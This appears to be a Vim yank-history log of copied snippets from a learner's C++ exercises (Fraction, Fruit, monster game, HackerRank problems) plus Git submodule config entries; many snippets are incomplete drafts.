4f9027a4f38566938a676b806633f083|file:///home/neo/cplusplus/chapter9/Fraction.cpp|18|35|v|cpp
	const Fraction &f1
d816318fae7e0ec0c7cd202f87ff8bbf|file:///home/neo/cplusplus/chapter9/Fraction.cpp|17|1|V|cpp
	        friend Fraction operator*(const Fraction &f, int n);
42c5ddd73c68ce3ec3217a398e0a9e5e|file:///home/neo/cplusplus/chapter9/Fraction.cpp|17|1|V|cpp
	        friend Fraction operator*(const Fraction &f, int n);
	        friend Fraction operator*(int n, const Fraction &f);
71bec007569f39d3f3735803770eb068|file:///home/neo/cplusplus/chapter9/Fraction.cpp|24|1|v|cpp
	friend 
75192c014e39e27ddaf4505f93c68798|file:///home/neo/cplusplus/chapter9/Fraction.cpp|26|1|V|cpp
	    return {f.m_numerator * n, f.m_denominator};
841265dfe66d2891e85a1eead60e2c47|file:///home/neo/cplusplus/chapter9/Fraction.cpp|32|5|V|cpp
	    return Fraction{n} * f;
bfb77520994c313d1abff83000f19dc3|file:///home/neo/cplusplus/chapter9/Fraction.cpp|3|1|V|cpp
	1
	2
	3
fae7e3dba19c7de24c514d31a79f3ef2|file:///home/neo/cplusplus/chapter9/Fraction.cpp|3|1|V|cpp
	int gcd(int a, int b) {
	    return (b == 0) ? (a > 0 ? a : -a) : gcd(b, a % b);
	}
e947c7b6800697ae2247d070b7760b23|file:///home/neo/cplusplus/chapter9/Fraction.cpp|31|1|V|cpp
	        friend std::ostream& operator<<(std::ostream& out, Fraction f);
a761c40b9b5f58a18623afab31072fb7|file:///home/neo/cplusplus/chapter9/Fraction.cpp|35|1|V|cpp
	std::ostream& operator<<>
101dade1a7cdfdb18aed7dd4165306d4|file:///home/neo/cplusplus/chapter9/Fraction.cpp|31|16|v|cpp
	std::ostream& operator<<(std::ostream& out, Fraction f);
a38a5cd6f2c7b112493d9e6c05098886|file:///home/neo/cplusplus/chapter9/Fraction.cpp|14|1|V|cpp
	        void print(){
	            std::cout << m_numerator << '/' << m_denominator << '\n';
	        }
35f76af53f754c47cdf86cb1750d59f3|file:///home/neo/cplusplus/chapter9/Fraction.cpp|28|16|v|cpp
	std::istream& operator>>(std::istream& in, Fraction f);
79b4c4ae535565f4e615186441936eff|file:///home/neo/cplusplus/chapter9/Fraction.cpp|32|52|v|cpp
	 << '\n';
0396db90279e50b3b57300f33de09f0c|file:///home/neo/cplusplus/chapter9/Car.cpp|18|16|v|cpp
	bool operator<(const Car &c1, const Car &c2)
d80ee2381b9c5a8306e930c934a9c70c|file:///home/neo/cplusplus/chapter9/Car.cpp|1|1|V|cpp
	
	1
	2
	3
	4
	5
	6
	7
	8
	9
	10
	11
	12
	13
	14
	15
	16
	17
	18
	19
	20
	21
66c8412f56c0f42a3e511ae548138b53|file:///home/neo/cplusplus/chapter9/Car.cpp|17|1|V|cpp
	        friend std::ostream &operator<<(std::ostream &out, const Car &c);
	        friend bool operator<(const Car &c1, const Car &c2);
d8ee2337c86bb6e91effab62113b3344|file:///home/neo/cplusplus/chapter9/students.cpp|14|9|v|cpp
	std::vector<StudentGrade>
35a588755f7fda21213c304314020a3e|file:///home/neo/cplusplus/chapter9/students.cpp|17|1|V|cpp
	            if (student_grade_vector::iterator sg{std::find_if(m_map.begin(), m_map.end(), index)}; sg != m_map.end()){
	                return (*sg).grade;
	            }
	            student_grade_vector::push_back(StudentGrade{index,})
	        }
6a992d5529f459a44fee58c733255e86|file:///home/neo/cplusplus/chapter9/students.cpp|19|47|v|cpp
	index
1260f56b58be7042e44e0765c6d57ed7|file:///home/neo/cplusplus/chapter9/students.cpp|21|43|v|cpp
	std::find_if(m_map.begin(), m_map.end(), index)
6cfe61694ee1bb13ae719d47c2f80b7a|file:///home/neo/cplusplus/chapter9/students.cpp|20|10|v|cpp
	found
05116499b5447f27f5ac266e855bf7e1|file:///home/neo/cplusplus/chapter9/students.cpp|23|9|v|cpp
	student_grade_vector::iterator sg{};
25518304932b06d8dd7aa12c0aff9062|file:///home/neo/cplusplus/chapter9/students.cpp|26|37|v|cpp
	StudentGrade{index,}
f159a7910730fe39c7514d03401e3993|file:///home/neo/cplusplus/chapter9/q99_1.cpp|12|1|V|cpp
	        {
	            std::string ret{};
	            for (int idx = start; idx < len; idx ++){
	                ret += m_str[idx];
	            }
	        }
f9fd46dfdaf2a5dde4e0ed7169fd79d3|file:///home/neo/cplusplus/chapter9/q99_1.cpp|12|16|v|cpp
	std::ostream &operator<<(std::ostream &out, Mystring str);
3bdd7f6b7babc5453c20ce649de4556b|file:///home/neo/cplusplus/chapter9/q99_1.cpp|21|1|v|cpp
	Mystring
2c520475d18b907d659601baf27b8f44|file:///home/neo/cplusplus/chapter9/q99_1.cpp|25|1|V|cpp
	    for (int idx = start; idx < start + len; idx ++){
	        ret += m_str[idx];
	    }
9665fcfaa4c8fd9b082e8d452c459996|file:///home/neo/cplusplus/chapter9/Average.cpp|21|16|v|cpp
	std::iostream &operator<<(std::iostream &out, const Average &avg);
201b3d16515d62baed4f3f499bf9b3ff|file:///home/neo/cplusplus/chapter9/IntArray.cpp|1|1|V|cpp
	
	4
	5
	6
	7
	8
	9
	10
	11
	12
	13
	14
	15
	16
	17
	18
	19
	20
	21
	22
	23
	24
	25
	26
	27
	28
	29
	30
f07a48fff952c84dee00e743d7f417b7|file:///home/neo/cplusplus/chapter9/IntArray.cpp|5|9|V|cpp
	        int m_array[];
a4cf98abdafab708d30b8d2ae8d57be8|file:///home/neo/cplusplus/chapter9/IntArray.cpp|14|9|v|cpp
	IntArray
f56532b0621638895771c156abe4c38e|file:///home/neo/cplusplus/chapter9/IntArray.cpp|26|1|V|cpp
	        friend std::ostream &operator<<(std::ostream &out, const IntArray &array);
6aac57e35f7443d14e133a7df6b761de|file:///home/neo/cplusplus/chapter9/IntArray.cpp|26|16|v|cpp
	std::ostream &operator<<(std::ostream &out, const IntArray &array);
b28995aa99666ccc9d27b7164425e121|file:///home/neo/cplusplus/chapter9/IntArray.cpp|30|42|v|cpp
	 : array.m_array
c07b672f1bfe4f8f761837fa97b3928e|file:///home/neo/cplusplus/chapter9/IntArray.cpp|19|9|V|cpp
	        int &operator[](int idx){
8fb719afe2479ffc09ee5ee6e51a641b|file:///home/neo/cplusplus/chapter9/IntArray.cpp|16|13|V|cpp
	            this->m_size = array.m_size;
edf5dcadd399bb8095e2b253e62264ef|file:///home/neo/cplusplus/chapter9/IntArray.cpp|16|1|V|cpp
	            delete [] m_array;
daa5c1e3cf64991bf09e17444b54101a|file:///home/neo/cplusplus/chapter9/IntArray.cpp|16|1|V|cpp
	            m_array = new int[m_size];
	            for (int i = 0; i < m_size; i++){
	                m_array[i] = array.m_array[i];
	            }
0e176e67a0892fa85622ca03a8524e4a|file:///home/neo/cplusplus/chapter10/Department.cpp|30|1|V|cpp
	 / ...
3df40c9d37c169e2fbed623dc5e4f224|file:///home/neo/cplusplus/chapter10/Department.cpp|22|1|V|cpp
	  const Teacher& m_teacher; // This dept holds only one teacher for simplicity, but it could hold many teachers
35ee1453ae3fb6262339e02c9d1c2827|file:///home/neo/cplusplus/chapter10/Department.cpp|27|7|V|cpp
	      : m_teacher{ teacher }
1d17cb9923b99f823da9f5a16dc460e5|file:///home/neo/cplusplus/chapter10/Department.cpp|26|3|v|cpp
	Department
62f7f77bdefde6137f045b2f42eb00ef|file:///home/neo/cplusplus/chapter10/Department.cpp|31|3|V|cpp
	  Department(){ }
8d53438c5240a090ffe61af4dbaf98fb|file:///home/neo/cplusplus/chapter10/Department.cpp|31|10|v|cpp
	std::ostream &operator<<(std::ostream &out, const Department &department)
3b26194b13edb91ea719ef5cbee8d5bd|file:///home/neo/cplusplus/chapter11/Fruit.cpp|14|7|v|cpp
	Fruit
70bbe862dd23640461153505ca39a9f5|file:///home/neo/cplusplus/chapter11/Fruit.cpp|9|1|V|cpp
	        Fruit(std::string &name, std::string &color)
8e0c0ce598f2b386b46927f77defaf38|file:///home/neo/cplusplus/chapter11/Fruit.cpp|25|9|V|cpp
	        B
10e51314a7eed86b1b229ccdf383502e|file:///home/neo/cplusplus/chapter11/Fruit.cpp|25|9|v|cpp
	const 
0082159abb3972dac11a3a9cc31e2a17|file:///home/neo/cplusplus/chapter11/Fruit.cpp|16|1|V|cpp
	        friend std::ostream &operator<<(std::ostream &out, const Fruit &fruit);
3af00c6cad11f7ab5db4467b66ce503e|file:///home/neo/cplusplus/chapter11/Fruit.cpp|36|1|v|cpp
	friend
e0deff349b2c61f5f796ccaa344a4930|file:///home/neo/cplusplus/chapter11/Fruit.cpp|27|73|v|cpp
	fruit
8d615fe7171b302022b19117d89bca4e|file:///home/neo/cplusplus/chapter11/Fruit.cpp|27|1|V|cpp
	        friend std::ostream &operator<<(std::ostream &out, const Apple &apple);
9f6290f4436e5a2351f12e03b6433c3c|file:///home/neo/cplusplus/chapter11/Fruit.cpp|36|66|v|cpp
	Apple
1f3870be274f6c49b3e31a0c6728957f|file:///home/neo/cplusplus/chapter11/Fruit.cpp|36|74|v|cpp
	apple
ab7e61bf3f9ee7645e291dad5a009c3d|file:///home/neo/cplusplus/chapter11/Fruit.cpp|39|30|v|cpp
	getColor
6345d09cae967230faeba2c6cedabf68|file:///home/neo/cplusplus/chapter11/Fruit.cpp|36|1|V|cpp
	        friend std::ostream &operator<<(std::ostream &out, const Banana &banana);
91283a827a760b617588875b4d7ccbd1|file:///home/neo/cplusplus/chapter11/Fruit.cpp|51|2|V|cpp
		const Apple a{ "Red delicious", "red", 4.2 };
		std::cout << a << '\n';
	 
		const Banana b{ "Cavendish", "yellow" };
		std::cout << b << '\n';
5c9d331065bf1cf796637c92cbcd6fd4|file:///home/neo/cplusplus/chapter11/Fruit2.cpp|9|1|V|cpp
	        Fruit(const std::string &name, const std::string &color)
a57f5670620984050c223496642404fa|file:///home/neo/cplusplus/chapter11/Fruit2.cpp|20|9|V|cpp
	        Apple(std)
c75dc97f22f0d9b464b923b7376f8a79|file:///home/neo/cplusplus/chapter11/Fruit2.cpp|17|1|V|cpp
	class Apple{
	    public:
	        Apple(const std::string &name, const std::string &color)
	            : Fruit(name, color)
	        {}
	};
a9984d30c6e265a0eab512f59ace1c75|file:///home/neo/cplusplus/chapter11/Fruit2.cpp|23|1|V|cpp
	        Apple(const std::string &color)
	            : Fruit{"apple", color}
	        {}
defcb3ec41231729da391bb1d1eb02f8|file:///home/neo/cplusplus/chapter11/Fruit2.cpp|35|23|v|cpp
	pple
e1ff53ffa4ebd38018ab9214d65074e5|file:///home/neo/cplusplus/chapter11/Fruit2.cpp|51|1|V|cpp
		Apple a{ "red" };
		Banana b;
	 
		std::cout << "My " << a.getName() << " is " << a.getColor() << ".\n";
		std::cout << "My " << b.getName() << " is " << b.getColor() << ".\n";
c1a601db44893c02a7800b20868731e1|file:///home/neo/cplusplus/chapter11/Fruit2.cpp|30|16|v|cpp
	const std::string &name, const std::string &color
316ed333d187673532e5506252a4e846|file:///home/neo/cplusplus/chapter11/Fruit2.cpp|23|1|V|cpp
	        Apple(const std::string &color = "red")
	            : Fruit{"apple", color}
	        {}
384261f81e2fec05f9e65ee8e265041a|file:///home/neo/.vim/bundle/.gitmodules|52|5|V|gitconfig
	[submodule "vim-refactor"]
		path = vim-refactor
		url = https://github.com/luchermitte/vim-refactor
	[submodule "lh-vim-lib"]
		path = lh-vim-lib
		url = git@github.com:LucHermitte/lh-vim-lib.git
	[submodule "lh-tags"]
		path = lh-tags
		url = git@github.com:LucHermitte/lh-tags.git
	[submodule "lh-dev"]
		path = lh-dev
		url = git@github.com:LucHermitte/lh-dev.git
	[submodule "lh-style"]
		path = lh-style
		url = git@github.com:LucHermitte/lh-style.git
	[submodule "lh-brackets"]
		path = lh-brackets
		url = git@github.com:LucHermitte/lh-brackets.git
2fce0d700ee2bb71c67444152e579e3f|file:///home/neo/.vim/bundle/.git/config|63|5|V|gitconfig
	[submodule "vim-refactor"]
		url = https://github.com/luchermitte/vim-refactor
		active = true
	[submodule "lh-vim-lib"]
		url = git@github.com:LucHermitte/lh-vim-lib.git
		active = true
	[submodule "lh-tags"]
		url = git@github.com:LucHermitte/lh-tags.git
		active = true
	[submodule "lh-dev"]
		url = git@github.com:LucHermitte/lh-dev.git
		active = true
	[submodule "lh-style"]
		url = git@github.com:LucHermitte/lh-style.git
		active = true
	[submodule "lh-brackets"]
		url = git@github.com:LucHermitte/lh-brackets.git
		active = true
2c17c6393771ee3048ae34d6b380c5ec|file:///home/neo/cplusplus/chapter11/Game.cpp|5|5|v|cpp
	private
759fa18ce8d1a04aa0dada2e0a6c2497|file:///home/neo/cplusplus/chapter11/Game.cpp|12|1|V|cpp
	        Creature(const std::string &name, char symbol, int health, int damage, int gold)
	            : m_name{name}, m_symbol{symbol}, m_health{health}, m_damage{damage}, m_gold{gold}
	        {}
24d8a9bdcc804369a4f444ce61c1a235|file:///home/neo/cplusplus/chapter11/Game.cpp|12|1|V|cpp
	        Creature(const std::string &name, char symbol, int health, int damage, int gold)
35a88e03e6699907873597f5549e0b7a|file:///home/neo/cplusplus/chapter11/Game.cpp|40|9|v|cpp
	Creature
56c644d518909ce20fce03d885e11e80|file:///home/neo/cplusplus/chapter11/Game.cpp|40|39|v|cpp
	, char symbol, int health, int damage, int gold
97bff26855a8bfa63e05d5477e794b24|file:///home/neo/cplusplus/chapter11/Game.cpp|41|30|v|cpp
	symbol
555bf8344ca0caf09b42f55e185526d8|file:///home/neo/cplusplus/chapter11/Game.cpp|41|35|v|cpp
	health
da14a7168b547f35ea0c6fa9f50de63e|file:///home/neo/cplusplus/chapter11/Game.cpp|41|39|v|cpp
	damage
e07e81c20cf5935f5225765f0af81755|file:///home/neo/cplusplus/chapter11/Game.cpp|41|42|v|cpp
	gold
e9dd8f9d2a4993c6ff6f6a7f43aaea15|file:///home/neo/cplusplus/chapter11/Game.cpp|57|14|v|cpp
	class 
63ab79039bd078af3ebf25b2992413ff|file:///home/neo/cplusplus/chapter11/Game.cpp|7|1|V|cpp
	        std::string m_name;
	        char m_symbol;
	        int m_health;
	        int m_damage;
	        int m_gold;
9a7f5d5c0dcda7ddd827d4a673c3c5c2|file:///home/neo/cplusplus/chapter11/Game.cpp|71|1|V|cpp
	    public:
	        enum Type{
	            DRAGON,
	            ORC,
	            SLIME,
	
	            MAX_TYPES
	        };
07c3de6f73f10bf320bd07f555c226e3|file:///home/neo/cplusplus/chapter11/Game.cpp|84|13|V|cpp
	            monster.monsterType
682202f59f698e37070d416b89d95fef|file:///home/neo/cplusplus/chapter11/Game.cpp|83|1|V|cpp
	            monsterData[type].symbol,
ee97a716bf09e5d30ddbd44c454c03df|file:///home/neo/cplusplus/chapter11/Game.cpp|109|1|V|cpp
	{
		Creature o{ "orc", 'o', 4, 2, 10 };
		o.addGold(5);
		o.reduceHealth(1);
		std::cout << "The " << o.getName() << " has " << o.getHealth() << " health and is carrying " << o.getGold() << " gold.\n";
	 	/* std::cout << "Enter your name: "; */
		/* std::string playerName; */
		/* std::cin >> playerName; */
	 
		/* Player p{ playerName }; */
		/* std::cout << "Welcome, " << p.getName() << ".\n"; */
	 
		/* std::cout << "You have " << p.getHealth() << " health and are carrying " << p.getGold() << " gold.\n"; */
		Monster m{ Monster::ORC };
		std::cout << "A " << m.getName() << " (" << m.getSymbol() << ") was created.\n";
	 
		std::srand(static_cast<unsigned int>(std::time(nullptr))); // set initial seed value to system clock
		std::rand(); // get rid of first result
	 
		for (int i{ 0 }; i < 10; ++i)
		{
			Monster m{ Monster::getRandomMonster() };
			std::cout << "A " << m.getName() << " (" << m.getSymbol() << ") was created.\n";
		}
7e5b182e89714371f3f2a4e7582b74aa|file:///home/neo/cplusplus/chapter11/Game.cpp|110|1|V|cpp
		Creature o{ "orc", 'o', 4, 2, 10 };
		o.addGold(5);
		o.reduceHealth(1);
		std::cout << "The " << o.getName() << " has " << o.getHealth() << " health and is carrying " << o.getGold() << " gold.\n";
	 	/* std::cout << "Enter your name: "; */
		/* std::string playerName; */
		/* std::cin >> playerName; */
	 
		/* Player p{ playerName }; */
		/* std::cout << "Welcome, " << p.getName() << ".\n"; */
	 
		/* std::cout << "You have " << p.getHealth() << " health and are carrying " << p.getGold() << " gold.\n"; */
		Monster m{ Monster::ORC };
		std::cout << "A " << m.getName() << " (" << m.getSymbol() << ") was created.\n";
	 
		std::srand(static_cast<unsigned int>(std::time(nullptr))); // set initial seed value to system clock
		std::rand(); // get rid of first result
	 
		for (int i{ 0 }; i < 10; ++i)
		{
			Monster m{ Monster::getRandomMonster() };
			std::cout << "A " << m.getName() << " (" << m.getSymbol() << ") was created.\n";
		}
		return 0;
b1148ed38d540b8fdfee1fd9476809c7|file:///home/neo/cplusplus/chapter11/Game.cpp|110|1|V|cpp
		Creature o{ "orc", 'o', 4, 2, 10 };
		o.addGold(5);
		o.reduceHealth(1);
		std::cout << "The " << o.getName() << " has " << o.getHealth() << " health and is carrying " << o.getGold() << " gold.\n";
e5ebb022a8f2a2feedd2e7c2d8cb8d20|file:///home/neo/cplusplus/chapter11/Game.cpp|117|1|V|cpp
		/* std::cout << "You have " << p.getHealth() << " health and are carrying " << p.getGold() << " gold.\n"; */
		Monster m{ Monster::ORC };
		std::cout << "A " << m.getName() << " (" << m.getSymbol() << ") was created.\n";
	 
24a544afc7f0f35db1fb7b8f3fdb0b70|file:///home/neo/cplusplus/chapter11/Game.cpp|117|2|V|cpp
		std::srand(static_cast<unsigned int>(std::time(nullptr))); // set initial seed value to system clock
		std::rand(); // get rid of first result
d3334ee43a67bde4e19b45c27c529d8f|file:///home/neo/cplusplus/chapter11/Game.cpp|125|3|V|cpp
			Monster m{ Monster::getRandomMonster() };
f2dd6d7c584a5a2d8d3ac8390a8ef177|file:///home/neo/cplusplus/chapter11/Game.cpp|125|1|V|cpp
		for (int i{ 0 }; i < 10; ++i)
		{
			std::cout << "A " << m.getName() << " (" << m.getSymbol() << ") was created.\n";
		}
8a51f813f3137d86260d891de532686b|file:///home/neo/cplusplus/chapter11/Game.cpp|126|1|V|cpp
	        std::cout << "(R)un or (F)ight:";
	        std::cin >> choice;
	        if (choice == 'R' || choice == 'r')
069c248c133c022618c8b7556d254156|file:///home/neo/cplusplus/chapter11/Game.cpp|126|2|V|cpp
			Monster m{ Monster::getRandomMonster() };
	        std::cout << "You have encountered a " << m.getName() << " (" << m.getSymbol() << ").\n";
	        do{
	            std::cout << "(R)un or (F)ight:";
	            std::cin >> choice;
	            if (choice == 'R' || choice == 'r'){
	            }
	            else if (choice == 'F' || choice == 'f'){
	            }
	            else{
	                std::cout << "Wrong choice!\n";
	            }
	        } while(choice != 'R' && choice != 'r' && choice != 'f' && choice != 'F');
690e73684dc9ad300578d1750c4ca2d1|file:///home/neo/cplusplus/chapter11/Game.cpp|115|42|V|cpp
	            if (choice == 'R' || choice == 'r'){
	            }
f2f29c2c39d59ac671290fdecb79657d|file:///home/neo/cplusplus/chapter11/Game.cpp|134|17|V|cpp
	                std::cout << "Wrong choice!\n";
95e090a8f104f911f122eacb435226b7|file:///home/neo/cplusplus/chapter11/Game.cpp|133|13|V|cpp
	            else{
	            }
497c0946e22122b05bc2b7b2f2429bc7|file:///home/neo/cplusplus/chapter11/Game.cpp|136|1|V|cpp
	            attackPlayer(p, m);
	            if (!m.isDead()){
	                attackMonster(m, p);
	            }
ea63be94c49f86c6eb95e6351f3a6d5c|file:///home/neo/cplusplus/chapter11/Game.cpp|164|12|v|cpp
	!p.isDead() && ! p.hasWon()
ac47fc10dfc4177b14689ec62b31053a|file:///home/neo/cplusplus/chapter11/Game.cpp|167|1|V|cpp
	            std::cout << "You lost! You had " << p.getGold() << " gold.\n"
	            return 0;
1c9a44eb2e8eaf3da1eb551da310cce7|file:///home/neo/cplusplus/chapter11/Game.cpp|171|31|v|cpp
	lost
f17a3d0b0f8877cce980f1fa00a7dc17|file:///home/neo/cplusplus/chapter11/Game.cpp|113|1|V|cpp
	    m.reduceHealth(p.getDamage());
	    std::cout << "You hit the " << m.getName() << " for " << p.getDamage() << " damage.\n";
	    if (m.isDead()){
	        std::cout << "You killed the " << m.getName() << ".\n";
	        p.levelUp();
	        std::cout << "You are now level " << p.getLevel() << ".\n";
	        p.addGold(m.getGold());
	        std::cout << "You found " << m.getGold() << " gold.\n";
	    }
fad74c18fc7f00051d49a4703fb3b1d5|file:///home/neo/cplusplus/chapter11/Game.cpp|118|5|V|cpp
	    p.reduceHealth(m.getDamage());
7ab629f5922cb4cc24f3a28198f68ba7|file:///home/neo/cplusplus/chapter12/Shape.cpp|5|37|v|cpp
	std::ostream &out, Shape &shape
c817ff07980c228277e05a13b4c013f4|file:///home/neo/cplusplus/chapter12/Shape.cpp|9|5|V|cpp
	    out << 
fc69a359565f35bf130a127ae2ebf2da|file:///home/neo/cplusplus/chapter12/Shape.cpp|44|1|V|cpp
	1
	2
	3
	4
	5
	6
	7
	8
	9
	10
09382032d6c246779005f565453d8804|file:///home/neo/cplusplus/chapter12/Shape.cpp|62|1|V|cpp
	        virtual ~Circle(){};
b4b737f26d3a35892e050be5088dbbb5|file:///home/neo/cplusplus/chapter12/Shape.cpp|45|4|V|cpp
	        virtual ~Triangle(){}
	
59857067fc3ccc75aafc1447826e8b0c|file:///home/neo/cplusplus/chapter12/Shape.cpp|66|1|V|cpp
	int main()
	{
	    Circle c{ Point{ 1, 2, 3 }, 7 };
	    std::cout << c << '\n';
	 
	    Triangle t{Point{1, 2, 3}, Point{4, 5, 6}, Point{7, 8, 9}};
	    std::cout << t << '\n';
	 
	    return 0;
	}
b3c765a11de31641e0c5070740453f66|file:///home/neo/cplusplus/chapter12/Shape.cpp|75|2|V|cpp
		// print each shape in vector v on its own line here
50a4a08b1c89368740cfc79e88c7d2b0|file:///home/neo/cplusplus/chapter13/Pair1.cpp|1|1|V|cpp
	
	1
	2
	3
	4
	5
	6
	7
	8
	9
	10
80d1bece5174ee9af78df240eadd0a05|file:///home/neo/cplusplus/chapter13/Pair1.cpp|13|1|V|cpp
	        T &first(){return m_first;}
fa75811fd9316251d25d7a1bc6ac934c|file:///home/neo/cplusplus/chapter13/Pair.cpp|1|1|V|cpp
	
	2
	3
	4
	5
	6
	7
	8
	9
	10
088624f1d72337e2b7e9335f0b995e66|file:///home/neo/cplusplus/chapter13/Pair.cpp|19|18|v|cpp
	, std::string &str
bd88e53e90da90dc8d9106474968e024|file:///home/neo/cplusplus/chapter13/Pair.cpp|25|9|V|cpp
	        {}
e155ca385f7cf2e0225105df22ac7b42|file:///home/neo/cplusplus/chapter14/Fraction.cpp|15|1|V|cpp
	    std::cout >> "Enter the numerator: ";
0b5670f80da5eefe891e2ef863953612|file:///home/neo/cplusplus/chapter14/Fraction.cpp|17|29|v|cpp
	numerator
100485c3a88be81bb362d6eae4f6f766|file:///home/neo/cplusplus/chapter14/Fraction.cpp|17|1|V|cpp
	    std::cout << "Enter the numerator: ";
	    std::cin >> numerator;
	    std::cout << "Enter the denominator: ";
	    std::cin >> denominator;
edb626855cfc0379f51d4b6bd844a0ba|file:///home/neo/cplusplus/chapter14/Fraction.cpp|20|5|V|cpp
	    } catch(std::exception &exception){
11eb635b0ac177a6db2becef8b22df65|file:///home/neo/cplusplus/chapter14/Fraction.cpp|24|22|v|cpp
	"Invalid denominator\n";
e2e5c2b89ed5afee5a807bfe4116aa33|file:///home/neo/cplusplus/chapter15/Pointer.cpp|34|2|V|cpp
		delete ptr;
441909f3f6bf06f5dd71ea1800bbc2e9|file:///home/neo/cplusplus/chapter15/reductive.cpp|7|7|v|cpp
	shared_ptr
19571498b726029aa1a5f5e08805faf6|file:///home/neo/cplusplus/hr.cpp|6|1|V|cpp
	#include <array>
47a89beef9ca721e2c1f3b51d66a1b33|file:///home/neo/cplusplus/hr.cpp|15|1|V|cpp
	    std::array<std::vector<int>*, n>
8467b5ae996ac1dec80a2f56ad1859d8|file:///home/neo/cplusplus/hr.cpp|15|25|v|cpp
	 = new std::vector<int>[n];
4ff6fab65a4c763301ae42b219050836|file:///home/neo/cplusplus/hr.cpp|22|9|V|cpp
	        std::cin >> in;
	        a[i].push_back(in);
42ff43d061b7d10d9315ce6c8c9a7636|file:///home/neo/cplusplus/hr.cpp|11|1|V|cpp
	    int n{};
	    int q{};
	    std::cin >> n;
	    std::cin >> q;
	    std::vector<int> a[n];
	    int in{};
	    int v_size{};
	    for (int i = 0; i < n; i++){
	        std::cin >> v_size;
	        for (int j = 0; j < v_size; j++){
	            std::cin >> in;
	            a[i].push_back(in);
	        }
	    }
	    int n_arr{};
	    int n_pos{};
	    for (int query = 0; query < q; query ++){
	        std::cin >> n_arr;
	        std::cin >> n_pos;
	        std::cout << a[n_arr][n_pos];
	    }
b83cc5f241df176be013eb27ff09eaca|file:///home/neo/cplusplus/hr.cpp|1|1|V|cpp
	#include <cmath>
	#include <cstdio>
	#include <vector>
	#include <iostream>
	#include <algorithm>
	using namespace std;
	
	
	int main() {
	    /* Enter your code here. Read input from STDIN. Print output to STDOUT */   
	    int n{};
	    int q{};
	    std::cin >> n;
	    std::cin >> q;
	    std::vector<int> a[n];
	    int in{};
	    int v_size{};
	    for (int i = 0; i < n; i++){
	        std::cin >> v_size;
	        for (int j = 0; j < v_size; j++){
	            std::cin >> in;
	            a[i].push_back(in);
	        }
	    }
	    int n_arr{};
	    int n_pos{};
	    for (int query = 0; query < q; query ++){
	        std::cin >> n_arr;
	        std::cin >> n_pos;
	        std::cout << a[n_arr][n_pos];
	    }
	    return 0;
	}
2242b8f2b63b46221080c6215c92f767|file:///home/neo/cplusplus/hr.cpp|15|1|V|cpp
	vector<int> parseInts(string str) {
	    stringstream s(str);
	    vector<int> v;
	    int n{};
	    char com {','};
	    while (com == ','){
	        s >> n;
	        v.push_back(n);
	        s >> com;
	    }
	    return v;
		// Complete this function
f60be50875ede180e993ae30bf30e846|file:///home/neo/cplusplus/hr.cpp|4|1|V|cpp
	using namespace std;
729d8bce5f1f20e61393ea6fe294c936|file:///home/neo/cplusplus/hr.cpp|12|9|V|cpp
	        n_str >> n;
dde6b1b833b69fe374c2d07baa28220a|file:///home/neo/cplusplus/hr.cpp|10|5|V|cpp
	    int n{};
2a6580906308ba7ec45fd0d2006df624|file:///home/neo/cplusplus/hr.cpp|14|2|V|cpp
		// Complete this function
4f7228acede4368d44c2a41f34ce6281|file:///home/neo/cplusplus/hr.cpp|6|1|V|cpp
	vector<int> parseInts(string str) {
	    std::stringstream ss(str);
	    vector<int> v;
	    std::string n_str{}
	    while (std::getline(ss, n_str, ',')){
	        v.push_back(std::stoi(n_str));
	    }
	    return v;
	}
4eedffc9d2c42caf2836a15da4bf82f2|file:///home/neo/cplusplus/hr.cpp|43|1|V|cpp
	#include <sstream>
	#include <vector>
	#include <iostream>
	using namespace std;
	
	vector<int> parseInts(string str) {
	    std::stringstream ss(str);
	    vector<int> v;
	    std::string n_str{}
	    while (std::getline(ss, n_str, ',')){
	        v.push_back(std::stoi(n_str));
	    }
	    return v;
	}
	
	int main() {
	    string str;
	    cin >> str;
	    vector<int> integers = parseInts(str);
	    for(int i = 0; i < integers.size(); i++) {
	        cout << integers[i] << "\n";
	    }
	    
	    return 0;
	}
bb82a9dcac5c91adff3c8280d1c96ca1|file:///home/neo/cplusplus/hr.cpp|38|20|V|cpp
	        int tests{};
	        std::cin >> tests;
ae5084be2d1b4b4e08b8507cd86e4fd8|file:///home/neo/cplusplus/hr.cpp|38|1|V|cpp
	        try{
	            int comp{Server::compute(A, B)};
	            std::cout << comp << '\n';
	        } catch(std::bad_alloc) {
	            std::cout << "Not enough memory.\n";
	        } catch(std::exception &e){
	            std::cout << "Exception: " << e.what() << '\n';
	        } catch(...){
	            std::cout << "Other Exception.";
	        }
6417bea3f49d08223b2db1ba5393f6aa|file:///home/neo/cplusplus/hr.cpp|38|1|V|cpp
	        try{
	            int comp{Server::compute(A, B)};
	            std::cout << comp << '\n';
	        } catch(std::bad_alloc) {
	            std::cout << "Not enough memory.\n";
	        } catch(std::exception &e){
	            std::cout << "Exception: " << e.what() << '\n';
	        } catch(...){
	            std::cout << "Other Exception.\n";
	        }
4d067fda3159122fcdc84512f65689c3|file:///home/neo/cplusplus/hr.cpp|1|1|V|cpp
	#include <iostream>
	#include <exception>
	#include <string>
	#include <stdexcept>
	#include <vector>
	#include <cmath>
	using namespace std;
	
	class Server {
	private:
		static int load;
	public:
		static int compute(long long A, long long B) {
			load += 1;
			if(A < 0) {
				throw std::invalid_argument("A is negative");
			}
			vector<int> v(A, 0);
			int real = -1, cmplx = sqrt(-1);
			if(B == 0) throw 0;
			real = (A/B)*real;
			int ans = v.at(B);
			return real + A - B*ans;
		}
		static int getLoad() {
			return load;
		}
	};
	int Server::load = 0;
	
	int main() {
		int T; cin >> T;
		while(T--) {
			long long A, B;
			cin >> A >> B;
	
			/* Enter your code here. */
	        try{
	            int comp{Server::compute(A, B)};
	            std::cout << comp << '\n';
	        } catch(std::bad_alloc) {
	            std::cout << "Not enough memory.\n";
	        } catch(std::exception &e){
	            std::cout << "Exception: " << e.what() << '\n';
	        } catch(...){
	            std::cout << "Other Exception.\n";
	        }
	
		}
		cout << Server::getLoad() << endl;
		return 0;
	}
6f06754792a8823c68be8731d54c2727|file:///home/neo/cplusplus/hr.cpp|13|50|v|cpp
	= default;
59744b5f8f0233730dcbb081639c6cde|file:///home/neo/cplusplus/hr.cpp|24|12|V|cpp
	            std::string name;
8c7432882667925dd4958078587ac130|file:///home/neo/cplusplus/hr.cpp|24|1|V|cpp
	            std::cin >> m_name >> m_age >> m_publications >> m_cur_id;
4c9184f37cff01bcdc32dc486ec36961|file:///home/neo/cplusplus/hr.cpp|37|5|v|cpp
	public
aa95309a11552a7015393b9f77936f37|file:///home/neo/cplusplus/hr.cpp|29|58|v|cpp
	 >> m_cur_id;
